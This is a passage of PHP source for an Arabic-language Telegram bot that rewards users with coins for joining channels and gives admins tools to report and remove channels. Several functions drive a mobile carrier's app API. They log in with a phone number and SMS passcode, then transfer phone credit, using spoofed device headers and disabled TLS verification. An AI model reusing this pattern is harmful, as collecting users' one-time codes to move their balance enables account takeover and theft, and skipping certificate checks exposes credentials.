'text'=>"*نظام التمويل مغلق حاليا ❌*", 
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"$NamesBACK",'callback_data'=>"user_funding_main"]],
]
])
]);
return;
}
$skip_channels = $rshq['skip_channels'][$from_id] ?? [];
$found_channel = false;
foreach ($tmoil['db']["chs"] as $chs) {
if(in_array($chs, $skip_channels)){
continue;
}
$idM = $tmoil['chanels']["id_$chs"];
if (in_array($from_id, $tmoil['db']["$idM"]["joined_users"] ?? [])) {
continue;
}
if(!in_array($idM, $tmoil["chids"][$from_id] ?? [])) {
$mt = json_encode(bot('getChatMember', ['chat_id' => "@".$chs , 'user_id' => IDBot]));
$nt = json_decode($mt, true);
$bv = $chs;
if ($nt['result']['status'] == "administrator") {
$getChatMemberReq = file_get_contents("https://api.telegram.org/bot". API_KEY. "/getChatMember?chat_id=@" . $bv . "&user_id=" . $from_id);
$getChatMemberRes = json_decode($getChatMemberReq, true);
if ($getChatMemberRes['result']['status'] == "left" || $getChatMemberRes['result']['status'] == "kicked") {
$getch2 = json_decode(file_get_contents("https://api.telegram.org/bot". API_KEY. "/getChat?chat_id=@$bv"))->result;
$getN = $getch2->title;
if($getN == null) { $getN = "@$bv";}
$coinIshtrak = $rshq["coinNmero"] ?? "5";
bot('editMessagetext',[
'chat_id'=>$chat_id,
'message_id' => $message_id, 
'text'=>"*📮| اشترك في القناة : @$bv\n💎| ستحصل على : $coinIshtrak $currency_name*", 
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"تخطي ♻️",'callback_data'=>"skip_channel|$bv"]],
[['text'=>"اشتركت ✅",'callback_data'=>"getv|$bv" ],['text'=>"ارسـال ابـلاغ ⚠️",'callback_data'=>"sendblock|$bv" ]],
[['text'=>"$NamesBACK",'callback_data'=>"user_funding_main" ]]
]
])
]);
$found_channel = true;
return;
} else {
$j = @file_get_contents("edid/@$bv/from_id.txt");
if(!in_array($from_id, explode("\n", $j))){
$coinIshtrak = $rshq["coinNmero"] ?? "5";
file_put_contents("edid/@$bv/from_id.txt", $from_id . "\n", FILE_APPEND);
$rshq["coin"][$from_id] += $coinIshtrak;
SETJSON($rshq);
$tmoil['db']["$idM"]["startc"] += 1;
$tmoil['db']["$idM"]["joined_users"][] = $from_id;
$tmoil["chids"][$from_id][] = $idM;
SETJSON1($tmoil);
bot('answerCallbackQuery',[
'callback_query_id'=>$update->callback_query->id,
'text'=>"✅ تم اضافه $coinIshtrak $currency_name الي حسابك",
'show_alert'=>true
]);
$start_msg = parse_start_message($start_message, $coin, $currency_name, $share, $tlby, $from_id, $name, $user);
bot('editMessagetext',[
'chat_id'=>$chat_id,
'message_id' => $message_id, 
'text'=>$start_msg, 
'parse_mode'=>"HTML",
'reply_markup'=>json_encode($Rjoo)
]);
return;
}
}
}
}
}
if(!$found_channel){
bot('answerCallbackQuery',[
'callback_query_id'=>$update->callback_query->id,
'text'=>"⛔ لا توجد قنوات متاحة للاشتراك حالياً\nقم بتجميع $currency_name عن طريق رابط الدعوه",
'show_alert'=>true
]);
$start_msg = parse_start_message($start_message, $coin, $currency_name, $share, $tlby, $from_id, $name, $user);
bot('editMessagetext',[
'chat_id'=>$chat_id,
'message_id' => $message_id, 
'text'=>$start_msg, 
'parse_mode'=>"HTML",
'reply_markup'=>json_encode($Rjoo)
]);
}
}
}
if($data_[0] == "skip_channel"){
$bv = $data_[1];
if(!isset($rshq['skip_channels'][$from_id])){
$rshq['skip_channels'][$from_id] = [];
}
if(!in_array($bv, $rshq['skip_channels'][$from_id])){
$rshq['skip_channels'][$from_id][] = $bv;
SETJSON($rshq);
}
bot('answerCallbackQuery',[
'callback_query_id'=>$update->callback_query->id,
'text'=>"✅ تم تخطي قناة @$bv",
'show_alert'=>true
]);
$funding_status = $rshq['funding_status'] ?? "on";
if($funding_status == "off"){
bot('editMessagetext',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"*نظام التمويل مغلق حاليا ❌*",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode(['inline_keyboard'=>[[['text'=>"$NamesBACK",'callback_data'=>"user_funding_main"]]]])
]);
return;
}
$skip_channels = $rshq['skip_channels'][$from_id] ?? [];
$found_channel = false;
foreach ($tmoil['db']["chs"] as $chs) {
if(in_array($chs, $skip_channels)){
continue;
}
$idM = $tmoil['chanels']["id_$chs"];
if (in_array($from_id, $tmoil['db']["$idM"]["joined_users"] ?? [])) {
continue;
}
if(!in_array($idM, $tmoil["chids"][$from_id] ?? [])) {
$mt = json_encode(bot('getChatMember', ['chat_id' => "@".$chs , 'user_id' => IDBot]));
$nt = json_decode($mt, true);
$bv = $chs;
if ($nt['result']['status'] == "administrator") {
$getChatMemberReq = file_get_contents("https://api.telegram.org/bot". API_KEY. "/getChatMember?chat_id=@" . $bv . "&user_id=" . $from_id);
$getChatMemberRes = json_decode($getChatMemberReq, true);
if ($getChatMemberRes['result']['status'] == "left" || $getChatMemberRes['result']['status'] == "kicked") {
$getch2 = json_decode(file_get_contents("https://api.telegram.org/bot". API_KEY. "/getChat?chat_id=@$bv"))->result;
$getN = $getch2->title;
if($getN == null) { $getN = "@$bv";}
$coinIshtrak = $rshq["coinNmero"] ?? "5";
bot('editMessagetext',[
'chat_id'=>$chat_id,
'message_id' => $message_id, 
'text'=>"*📮| اشترك في القناة : @$bv\n💎| ستحصل على : $coinIshtrak $currency_name*", 
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"تخطي ♻️",'callback_data'=>"skip_channel|$bv"]],
[['text'=>"اشتركت ✅",'callback_data'=>"getv|$bv" ],['text'=>"ارسـال ابـلاغ ⚠️",'callback_data'=>"sendblock|$bv" ]],
[['text'=>"$NamesBACK",'callback_data'=>"user_funding_main" ]]
]
])
]);
$found_channel = true;
return;
} else {
$j = @file_get_contents("edid/@$bv/from_id.txt");
if(!in_array($from_id, explode("\n", $j))){
$coinIshtrak = $rshq["coinNmero"] ?? "5";
file_put_contents("edid/@$bv/from_id.txt", $from_id . "\n", FILE_APPEND);
$rshq["coin"][$from_id] += $coinIshtrak;
SETJSON($rshq);
$tmoil['db']["$idM"]["startc"] += 1;
$tmoil['db']["$idM"]["joined_users"][] = $from_id;
$tmoil["chids"][$from_id][] = $idM;
SETJSON1($tmoil);
bot('answerCallbackQuery',[
'callback_query_id'=>$update->callback_query->id,
'text'=>"✅ تم اضافه $coinIshtrak $currency_name الي حسابك",
'show_alert'=>true
]);
$start_msg = parse_start_message($start_message, $coin, $currency_name, $share, $tlby, $from_id, $name, $user);
bot('editMessagetext',[
'chat_id'=>$chat_id,
'message_id' => $message_id, 
'text'=>$start_msg, 
'parse_mode'=>"HTML",
'reply_markup'=>json_encode($Rjoo)
]);
return;
}
}
}

}
if(!$found_channel){
bot('editMessagetext',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"✅ تم تخطي جميع القنوات المتاحة",
'reply_markup'=>json_encode(['inline_keyboard'=>[[['text'=>"$NamesBACK",'callback_data'=>"user_funding_main"]]]])
]);
}
}
foreach ($tmoil["chids"][$from_id] ?? [] as $idM) {
$info = $tmoil['db'][$idM] ?? null;
$channel = null;
if($info) $channel = array_search($idM, $tmoil['chanels']);
if(!$channel) continue;
$get = bot('getChatMember', ['chat_id' => "@$channel", 'user_id' => $from_id]);
$res = $get->result->status ?? 'left';
if($res == "left"){
$coinTaken = $rshq["leave_penalty"] ?? 5;
$rshq["coin"][$from_id] -= $coinTaken;
if ($rshq["coin"][$from_id] < 0) $rshq["coin"][$from_id] = 0;
$index = array_search($idM, $tmoil["chids"][$from_id]);
if($index !== false) unset($tmoil["chids"][$from_id][$index]);
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"
📛 لقد قمت بمغادرة قناة [@$channel]
⛔ تم خصم $coinTaken $currency_name من حسابك بسبب المغادرة.
",
'parse_mode'=>"markdown",
]);
SETJSON($rshq);
SETJSON1($tmoil);
}
}
}
if($data_[0] == "sendblock") {
if(!in_array($data_[1],$tmoil['blockers']["$from_id"])){
$bv = $data_[1];
bot('answerCallbackQuery',[
'callback_query_id'=>$update->callback_query->id,
'text'=>"
⛔] تم ارسال الابلاغ شكرا علي تعاونك معنا
",
'show_alert'=>true
]);
bot('sendMessage',[
 'chat_id'=>$joo ,
 'text'=>"
🍪] ابلاغ جديد عزيزي المطور

🔛] من [$name](tg://user?id=$chat_id) 
👤] معرفه : [@$user] 
🔔] الي القناة : [@$bv] 
", 
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
 'inline_keyboard'=>[
 [['text'=>"@$bv",'url'=>"https://t.me/$data_[1]" ]], 
 [['text'=>"ازاله من التمويل 🌀",'callback_data'=>"delete|$bv" ]], 
 ]
 ])
]);
$tmoil['blockers']["$from_id"][] = $data_[1];
SETJSON1($tmoil); 
}else{
bot('answerCallbackQuery',[
'callback_query_id'=>$update->callback_query->id,
'text'=>"
📛] القناة مبلغ عليها من قبلك بالفعل
",
'show_alert'=>true
]);
} 
}
if($data_[0] == "delete") {
$f="@".$data_[1];
$bv = str_replace("@",null, $f) ;
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"
- هل انت متاكد من ازاله القناة? ⚠️
",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
 'inline_keyboard'=>[
 [['text'=>"نعم",'callback_data'=>"deletere|$bv" ]],
 [['text'=>"نعم + حظر القناة",'callback_data'=>"deletereblock|$bv" ]],
 [['text'=>"لا",'callback_data'=>"deysx|$bv" ]],
 ]
 ])
]);
}
if($data_[0] == "deletere") {
$f="@".$data_[1];
$bv = str_replace("@",null, $f) ;
bot('answerCallbackQuery',[
'callback_query_id'=>$update->callback_query->id,
'text'=>"
📊] تم ازاله القناة [$f] من التمويل 
",
'show_alert'=>true
]);
$bv = $data_[1];
$st=array_search($bv,$tmoil['db']["chs"]);
if($st !== false){
unset($tmoil['db']["chs"][$st]);
$tmoil['db']["chs"]=array_values($tmoil['db']["chs"]);
}
SETJSON1($tmoil); 
$start_msg = parse_start_message($start_message, $coin, $currency_name, $share, $tlby, $from_id, $name, $user);
bot('editMessagetext',[
 'chat_id'=>$chat_id,
 'message_id' => $message_id, 
 'text'=>$start_msg, 
 'parse_mode'=>"markdown",
 'reply_markup'=>json_encode($Rjoo)
]);
}
if($data_[0] == "deletereblock") {
$f="@".$data_[1];
$bv = str_replace("@",null, $f) ;
bot('answerCallbackQuery',[
'callback_query_id'=>$update->callback_query->id,
'text'=>"
📊] تم ازاله القناة [$f] من التمويل وتم حظرها من التمويل 
",
'show_alert'=>true
]);
$bv = $data_[1];
$st=array_search($bv,$tmoil['db']["chs"]);
if($st !== false){
unset($tmoil['db']["chs"][$st]);
$tmoil['db']["chs"]=array_values($tmoil['db']["chs"]);
}
$tmoil["blocks"][] = $bv;
SETJSON1($tmoil); 
$start_msg = parse_start_message($start_message, $coin, $currency_name, $share, $tlby, $from_id, $name, $user);
bot('editMessagetext',[
 'chat_id'=>$chat_id,
 'message_id' => $message_id, 
 'text'=>$start_msg, 
 'parse_mode'=>"markdown",
 'reply_markup'=>json_encode($Rjoo)
]);
}
if($data_[0] == "deysx") {
$bv = $data_[1];
bot('editMessagetext',[
 'chat_id'=>$joo ,
 "message_id" => $message_id, 
 'text'=>"
🍪] قائمه الابلاغ

🔔] الي القناة : [@$bv] 
", 
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
 'inline_keyboard'=>[
 [['text'=>"@$bv",'url'=>"https://t.me/$data_[1]" ]], 
 [['text'=>"ازاله من التمويل 🌀",'callback_data'=>"delete|$bv" ]], 
 ]
 ])
]);
}
function LoginDB($num, $deviceInfo) {
$url = "https://odpapp.asiacell.com/api/v1/login?lang=ar";
$phone = preg_replace('/[^0-9]/', '', $num);
if (strpos($phone, '0') === 0) { $phone = substr($phone, 1); }
$payload = json_encode(["captchaCode" => "", "username" => $phone]);
$headers = ['User-Agent: okhttp/5.1.0', 'Connection: Keep-Alive', 'Accept-Encoding: gzip', 'X-ODP-API-KEY: ' . ASIA_API_KEY, 'Cache-Control: no-cache', 'DeviceID: ' . $deviceInfo['DeviceID'], 'X-OS-Version: 13', 'X-Device-Type: [Android][TECNO][TECNO KI7 13][TIRAMISU][GMS][4.3.7:90000323]', 'X-ODP-APP-VERSION: 4.3.7', 'X-FROM-APP: odp', 'X-ODP-CHANNEL: mobile', 'X-SCREEN-TYPE: false', 'Content-Type: application/json; charset=UTF-8'];
$ch = curl_init();
curl_setopt_array($ch, [CURLOPT_URL => $url, CURLOPT_RETURNTRANSFER => true, CURLOPT_ENCODING => "gzip", CURLOPT_MAXREDIRS => 10, CURLOPT_TIMEOUT => 30, CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1, CURLOPT_CUSTOMREQUEST => "POST", CURLOPT_POSTFIELDS => $payload, CURLOPT_HTTPHEADER => $headers, CURLOPT_SSL_VERIFYPEER => false, CURLOPT_SSL_VERIFYHOST => false]);
$result = curl_exec($ch);
curl_close($ch);
$resultData = json_decode($result, true);
if (isset($resultData['success']) && $resultData['success'] == true && isset($resultData['nextUrl'])) {
$nextUrl = $resultData['nextUrl'];
if (preg_match('/PID=([a-f0-9\-]+)/', $nextUrl, $matches)) { return ['success' => true, 'PID' => $matches[1]]; }
}
return ['success' => false];
}
function pass($es, $io, $deviceInfo) {
$url = "https://odpapp.asiacell.com/api/v1/smsvalidation?lang=ar";
$payload = json_encode(["PID" => $io, "passcode" => $es, "token" => "dnGWiiHJR9Soe4CXjDt3yn:APA91bHwUYmpZ5_48UA9pgB2xXkxEwnerz9MhHAMWRydVri1eVlDykzxPCQe_RxUDUjQqrtNJSuZ5c0KyWqhawJXkyZ7FzulA_GgkUCFCeEcraGfSDZUDuw"]);
$headers = ['User-Agent: okhttp/5.1.0', 'Connection: Keep-Alive', 'Accept-Encoding: gzip', 'X-ODP-API-KEY: ' . ASIA_API_KEY, 'Cache-Control: no-cache', 'DeviceID: ' . $deviceInfo['DeviceID'], 'X-OS-Version: 13', 'X-Device-Type: [Android][TECNO][TECNO KI7 13][TIRAMISU][GMS][4.3.7:90000323]', 'X-ODP-APP-VERSION: 4.3.7', 'X-FROM-APP: odp', 'X-ODP-CHANNEL: mobile', 'X-SCREEN-TYPE: false', 'Content-Type: application/json; charset=UTF-8'];
$ch = curl_init();
curl_setopt_array($ch, [CURLOPT_URL => $url, CURLOPT_RETURNTRANSFER => true, CURLOPT_ENCODING => "gzip", CURLOPT_MAXREDIRS => 10, CURLOPT_TIMEOUT => 30, CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1, CURLOPT_CUSTOMREQUEST => "POST", CURLOPT_POSTFIELDS => $payload, CURLOPT_HTTPHEADER => $headers, CURLOPT_SSL_VERIFYPEER => false, CURLOPT_SSL_VERIFYHOST => false]);
$result = curl_exec($ch);
curl_close($ch);
$response = json_decode($result, true);
if (isset($response['success']) && $response['success'] == true) { return ['success' => true, 'access_token' => $response['access_token'] ?? '', 'fullname' => $response['fullname'] ?? '']; }
return ['success' => false];
}
function Tran($isp, $amount, $phone, $deviceInfo) {
$url = "https://odpapp.asiacell.com/api/v1/credit-transfer/start?lang=ar";
$receiverPhone = '0' . preg_replace('/[^0-9]/', '', $phone);
$payload = json_encode(["receiverMsisdn" => $receiverPhone, "amount" => (float)$amount]);
$headers = ['User-Agent: okhttp/5.1.0', 'Connection: Keep-Alive', 'Accept-Encoding: gzip', 'X-ODP-API-KEY: ' . ASIA_API_KEY, 'Cache-Control: no-cache', 'DeviceID: ' . $deviceInfo['DeviceID'], 'X-OS-Version: 13', 'X-Device-Type: [Android][TECNO][TECNO KI7 13][TIRAMISU][GMS][4.3.7:90000323]', 'X-ODP-APP-VERSION: 4.3.7', 'X-FROM-APP: odp', 'X-ODP-CHANNEL: mobile', 'X-SCREEN-TYPE: MOBILE', 'Authorization: Bearer ' . $isp, 'Content-Type: application/json; charset=UTF-8'];
$ch = curl_init();
curl_setopt_array($ch, [CURLOPT_URL => $url, CURLOPT_RETURNTRANSFER => true, CURLOPT_ENCODING => "gzip", CURLOPT_MAXREDIRS => 10, CURLOPT_TIMEOUT => 30, CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1, CURLOPT_CUSTOMREQUEST => "POST", CURLOPT_POSTFIELDS => $payload, CURLOPT_HTTPHEADER => $headers, CURLOPT_SSL_VERIFYPEER => false, CURLOPT_SSL_VERIFYHOST => false]);
$result = curl_exec($ch);
curl_close($ch);
$response = json_decode($result, true);
if (isset($response['success']) && $response['success'] == true) { return ['success' => true, 'PID' => $response['PID'] ?? '']; }
return ['success' => false];
}
function Check($isp, $pid, $es, $deviceInfo) {
$url = "https://odpapp.asiacell.com/api/v1/credit-transfer/do-transfer?lang=ar";
$payload = json_encode(["pid" => $pid, "passcode" => $es]);
$headers = ['User-Agent: okhttp/5.1.0', 'Connection: Keep-Alive', 'Accept-Encoding: gzip', 'X-ODP-API-KEY: ' . ASIA_API_KEY, 'Cache-Control: no-cache', 'DeviceID: ' . $deviceInfo['DeviceID'], 'X-OS-Version: 13', 'X-Device-Type: [Android][TECNO][TECNO KI7 13][TIRAMISU][GMS][4.3.7:90000323]', 'X-ODP-APP-VERSION: 4.3.7', 'X-FROM-APP: odp', 'X-ODP-CHANNEL: mobile', 'X-SCREEN-TYPE: false', 'Authorization: Bearer ' . $isp, 'Content-Type: application/json; charset=UTF-8'];
$ch = curl_init();
curl_setopt_array($ch, [CURLOPT_URL => $url, CURLOPT_RETURNTRANSFER => true, CURLOPT_ENCODING => "gzip", CURLOPT_MAXREDIRS => 10, CURLOPT_TIMEOUT => 30, CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1, CURLOPT_CUSTOMREQUEST => "POST", CURLOPT_POSTFIELDS => $payload, CURLOPT_HTTPHEADER => $headers, CURLOPT_SSL_VERIFYPEER => false, CURLOPT_SSL_VERIFYHOST => false]);
$result = curl_exec($ch);
curl_close($ch);
$response = json_decode($result, true);
return ['success' => isset($response['success']) ? $response['success'] : false];
}

$bot_info_req = @bot('getMe');
$bot_info = $bot_info_req->result ?? null;
$bot_id = $bot_info->id ?? 8703576205;
$bot_username = $bot_info->username ?? "Unknown";
$bot_name = $bot_info->first_name ?? "Bot";



$db->query("CREATE TABLE IF NOT EXISTS users (id BIGINT PRIMARY KEY, username VARCHAR(255), first_name VARCHAR(255), is_admin INT DEFAULT 0, is_blocked INT DEFAULT 0, joined_at BIGINT)");
$db->query("CREATE TABLE IF NOT EXISTS groups (id BIGINT PRIMARY KEY, title VARCHAR(255), joined_at BIGINT)");
$db->query("CREATE TABLE IF NOT EXISTS settings (`key` VARCHAR(255) PRIMARY KEY, `value` LONGTEXT)");
$db->query("CREATE TABLE IF NOT EXISTS forced_channels (id INTEGER PRIMARY KEY AUTOINCREMENT, channel_id VARCHAR(255), channel_name VARCHAR(255), channel_link VARCHAR(255), required_count INT DEFAULT 0, current_count INT DEFAULT 0, is_active INT DEFAULT 1, joined_users LONGTEXT, owner_id BIGINT)");
$db->query("CREATE TABLE IF NOT EXISTS blocked_users (user_id BIGINT PRIMARY KEY)");
$db->query("CREATE TABLE IF NOT EXISTS admins (user_id BIGINT PRIMARY KEY)");

function getSetting($db, $key, $default = "❌"){
    $stmt = $db->prepare("SELECT `value` FROM settings WHERE `key` = ?");
    if(!$stmt) return $default;
    $stmt->bind_param("s", $key);
    $stmt->execute();
    $result = $stmt->get_result();
    if($row = $result->fetch_assoc()){
        return $row['value'];
    }
    return $default;
}

function setSetting($db, $key, $value){
    $stmt = $db->prepare("REPLACE INTO settings (`key`, `value`) VALUES (?, ?)");
    if(!$stmt) return false;
    $stmt->bind_param("ss", $key, $value);
    return $stmt->execute();
}

function isAdmin($db, $user_id){
    $stmt = $db->prepare("SELECT * FROM admins WHERE user_id = ?");
    if(!$stmt) return false;
    $stmt->bind_param("s", $user_id);
    $stmt->execute();
    $result = $stmt->get_result();
    return $result->fetch_assoc() ? true : false;
}

function isBlocked($db, $user_id){
    $stmt = $db->prepare("SELECT * FROM blocked_users WHERE user_id = ?");
    if(!$stmt) return false;
    $stmt->bind_param("s", $user_id);
    $stmt->execute();
    $result = $stmt->get_result();
    return $result->fetch_assoc() ? true : false;
}

function addUser($db, $user_id, $username, $first_name){
    $stmt = $db->prepare("INSERT IGNORE INTO users (id, username, first_name, joined_at) VALUES (?, ?, ?, ?)");
    if(!$stmt) return false;
    $joined_at = time();
    $stmt->bind_param("sssi", $user_id, $username, $first_name, $joined_at);
    return $stmt->execute();
}

function addGroup($db, $group_id, $title){
    $stmt = $db->prepare("INSERT IGNORE INTO groups (id, title, joined_at) VALUES (?, ?, ?)");
    if(!$stmt) return false;
    $joined_at = time();
    $stmt->bind_param("ssi", $group_id, $title, $joined_at);
    return $stmt->execute();
}

function updateChannelCount($db, $channel_id, $user_id){
    $stmt = $db->prepare("SELECT * FROM forced_channels WHERE channel_id = ? AND is_active = 1");
    if(!$stmt) return false;
    $stmt->bind_param("s", $channel_id);
    $stmt->execute();
    $result = $stmt->get_result();
    $channel = $result->fetch_assoc();

    if($channel){
        $joined_users = json_decode($channel['joined_users'], true) ?: [];
        if(!in_array($user_id, $joined_users)){
            $joined_users[] = $user_id;
            $new_count = $channel['current_count'] + 1;
            $joined_users_json = json_encode($joined_users);

            $update = $db->prepare("UPDATE forced_channels SET current_count = ?, joined_users = ? WHERE channel_id = ?");
            $update->bind_param("iss", $new_count, $joined_users_json, $channel_id);
            $update->execute();

            if($new_count >= $channel['required_count'] && $channel['required_count'] > 0){
                $del = $db->prepare("DELETE FROM forced_channels WHERE channel_id = ?");
                $del->bind_param("s", $channel_id);
                $del->execute();

                bot('sendMessage',[
                    'chat_id' => $channel['owner_id'],
                    'text' => "• تم اكتمال العدد المطلوب للقناة\n\nالقناة: {$channel['channel_name']}\nالعدد المطلوب: {$channel['required_count']}\n\nتم حذف القناة من قائمة الاشتراك الاجباري تلقائياً"
                ]);
            }
            return $new_count;
        }
    }
    return false;
}

function checkSubscription($db, $user_id, $channel_id){
    $member = bot('getChatMember',['chat_id' => $channel_id, 'user_id' => $user_id]);
    if(isset($member->result->status) && $member->result->status != "left"){
        return updateChannelCount($db, $channel_id, $user_id);
    }
    return false;
}

function getForcedChannels($db, $only_active = true){
    $sql = "SELECT * FROM forced_channels";
    if($only_active){
        $sql .= " WHERE is_active = 1";
    }
    $result = $db->query($sql);
    $channels = [];
    if($result){
        while($row = $result->fetch_assoc()){
            $channels[] = $row;
        }
    }
    return $channels;
}

function encryptBackup($data, $key = null){
    if($key === null){
        $key = md5(API_KEY);
    }
    $iv = openssl_random_pseudo_bytes(openssl_cipher_iv_length('aes-256-cbc'));
    $encrypted = openssl_encrypt($data, 'aes-256-cbc', $key, 0, $iv);
    return base64_encode($iv . $encrypted);
}

function decryptBackup($data, $key = null){
    if($key === null){
        $key = md5(API_KEY);
    }
    $data = base64_decode($data);
    $iv_length = openssl_cipher_iv_length('aes-256-cbc');
    $iv = substr($data, 0, $iv_length);
    $encrypted = substr($data, $iv_length);
    return openssl_decrypt($encrypted, 'aes-256-cbc', $key, 0, $iv);
}

$update = json_decode(file_get_contents('php://input'));
$message = $update->message ?? null;
$callback_query = $update->callback_query ?? null;

// تعريف آمن للمتغيرات عشان ميضربش Error
$text = ""; $chat_id = ""; $name = ""; $user = ""; $message_id = ""; $from_id = "";

if($message){
    $text = $message->text ?? "";
    $chat_id = $message->chat->id ?? "";
    $name = $message->from->first_name ?? "";
    $user = $message->from->username ?? "";
    $message_id = $message->message_id ?? "";
    $from_id = $message->from->id ?? "";
    $type = $message->chat->type ?? "";
    $forward_from_chat = $message->forward_from_chat ?? null;
    $document = $message->document ?? null;

    addUser($db, $from_id, $user, $name);

    if($type == "group" || $type == "supergroup"){
        addGroup($db, $chat_id, $message->chat->title ?? "");
    }

    if(isBlocked($db, $from_id) && !isAdmin($db, $from_id)){
        exit; 
    }

    $bot_status = getSetting($db, "bot_status", "✅");
    if($bot_status == "❌" && !isAdmin($db, $from_id)){
        bot('sendMessage',[
            'chat_id' => $chat_id,
            'text' => "البوت موقف من قبل المطور."
        ]);
        exit; 
    }
}

if($callback_query){
    $data = $callback_query->data ?? "";
    $chat_id = $callback_query->message->chat->id ?? "";
    $message_id = $callback_query->message->message_id ?? "";
    $from_id = $callback_query->from->id ?? "";
    $user = $callback_query->from->username ?? "";
    $name = $callback_query->from->first_name ?? "";

    addUser($db, $from_id, $user, $name);

    if(isBlocked($db, $from_id) && !isAdmin($db, $from_id)){
        bot('answerCallbackQuery',[
            'callback_query_id' => $callback_query->id,
            'text' => "أنت محظور من استخدام البوت",
            'show_alert' => true
        ]);
        exit; 
    }
}

// أمان إضافي عشان لو دالة getData مش موجودة ميقفش
$rshq = [];
if (function_exists('getData')) {
    $rshq = getData($db, 'rshq_data', 'rshq');
    if(!$rshq) $rshq = [];
}

$data = $data ?? "";
$text = $text ?? "";
$e = explode("|", $data);
$invite_num = null;

if(strpos($text, "/start") === 0){
    $after_start = trim(substr($text, 6));
    if(is_numeric($after_start)){
        $invite_num = (int)$after_start;
    } elseif(strpos($after_start, " ") !== false){
        $parts = explode(" ", $after_start);
        if(is_numeric($parts[0])){
            $invite_num = (int)$parts[0];
        }
    }
}
if($invite_num !== null && $invite_num > 0 && !preg_match("/#kilwa#/", $text)) {
    $rshq['HACKER'][$from_id] = "I";
    $rshq['HACK'][$from_id] = $invite_num;
    if (function_exists('SETJSON')) SETJSON($rshq);
}

$admin_id = $joo ?? "8371348104";
$owner_id = getSetting($db, "owner_id", $admin_id);

$stmt = $db->prepare("SELECT user_id FROM admins WHERE user_id = ?");
if($stmt){
    $stmt->bind_param("s", $owner_id);
    $stmt->execute();
    $result = $stmt->get_result();
    if(!$result->fetch_assoc()){
        $stmt = $db->prepare("INSERT INTO admins (user_id) VALUES (?)");
        $stmt->bind_param("s", $owner_id);
        $stmt->execute();
    }
}

$result = $db->query("SELECT COUNT(*) as count FROM users");
$total_users = $result ? $result->fetch_assoc()['count'] : 0;

$result = $db->query("SELECT COUNT(*) as count FROM groups");
$total_groups = $result ? $result->fetch_assoc()['count'] : 0;

$result = $db->query("SELECT COUNT(*) as count FROM blocked_users");
$total_blocked = $result ? $result->fetch_assoc()['count'] : 0;

if (!function_exists('GetChat')) {
    function GetChat($chat_id){
        return bot('getChat',['chat_id' => $chat_id]);
    }
}

if (!function_exists('GetChatMember')) {
    function GetChatMember($chat_id, $user_id){
        return bot('getChatMember',['chat_id' => $chat_id, 'user_id' => $user_id]);
    }
}

if (!function_exists('Slin')) {
    function Slin($a){
        $P = GetChat($a)->result ?? null;
        if($P && $P->username == null){
            if(isset($P->invite_link) && $P->invite_link != null){
                $d = $P->invite_link;
            }else{
                $exp = bot('exportChatInviteLink',['chat_id' => $a]);
                $d = $exp->result ?? "";
            }
        }else if($P){
            $d = "t.me/".$P->username;
        } else {
            $d = "";
        }
        return $d;
    }
}

$ex = explode("|", $data ?? '');

if($text == "/start"){
    if(isAdmin($db, $from_id)){
        $bot_status = getSetting($db, "bot_status", "✅");
        $twasl_status = getSetting($db, "twasl_status", "❌");
        $notify_status = getSetting($db, "notify_status", "✅");
        $auto_status = getSetting($db, "auto_status", "✅");
        $duplicate_status = getSetting($db, "duplicate_status", "❌");
        $filter_status = getSetting($db, "filter_status", "❌");
        $forced_status = getSetting($db, "forced_subscription", "✅");

        $keyboard = [
            'inline_keyboard' => [
                [['text' => "قسم الاحصائيات 📊", 'callback_data' => "status"]],
                [['text' => "عمل البوت : $bot_status", 'callback_data' => "in|bot"],['text' => " حاله التوجيه : $twasl_status", 'callback_data' => "in|twasl"]], 
                [['text' => " تنبيه الدخول : $notify_status", 'callback_data' => "in|notify"],['text' => "البوت في المجموعات : $auto_status", 'callback_data' => "in|auto"]],
                [['text' => "منع التكرار : $duplicate_status", 'callback_data' => "in|duplicate"],['text' => "تعديل (الازرار)", 'callback_data' => "zrar"],['text' => " التصفيه : $filter_status", 'callback_data' => "in|filter"]],
                [['text' => "قسم الحظر", 'callback_data' => "blockks"],['text' => "قسم الادمنيه", 'callback_data' => "admins"]],
                [['text' => "الاشتراك الاجباري", 'callback_data' => "ijbare"], ['text' => "الاذاعه", 'callback_data' => "broadcast"]],
                [['text' => "النسخ الاحتياطيه", 'callback_data' => "Nsxa"],['text' => "نقل الملكيه", 'callback_data' => "thoilmlk"]],
                [['text' => "• اعدادات البوت •", 'callback_data' => "rshqG"]],
            ]
        ];
        bot('sendMessage',[
            'chat_id' => $chat_id,
            'text' => "- اهلا بك عزيزي المطور في اعدادات البوت.\n----------------------------",
            'reply_markup' => json_encode($keyboard)
        ]);
    }
}

$forced_on = getSetting($db, "forced_subscription", "✅");
if($forced_on == "✅" && !isAdmin($db, $from_id)){
    $channels = getForcedChannels($db, true);
    $all_joined = true;
    $not_joined = [];
    
    foreach($channels as $channel){
        $member = GetChatMember($channel['channel_id'], $from_id);
        if(isset($member->result->status) && $member->result->status == "left"){
            $all_joined = false;
            $not_joined[] = $channel;
        } else {
            $stmt = $db->prepare("SELECT * FROM forced_channels WHERE channel_id = ? AND is_active = 1");
            if($stmt){
                $stmt->bind_param("s", $channel['channel_id']);
                $stmt->execute();
                $result = $stmt->get_result();
                $channel_data = $result->fetch_assoc();
                
                if($channel_data){
                    $joined_users = json_decode($channel_data['joined_users'], true) ?: [];
                    if(!in_array($from_id, $joined_users)){
                        $joined_users[] = $from_id;
                        $new_count = $channel_data['current_count'] + 1;
                        $joined_users_json = json_encode($joined_users);
                        
                        $update = $db->prepare("UPDATE forced_channels SET current_count = ?, joined_users = ? WHERE channel_id = ?");
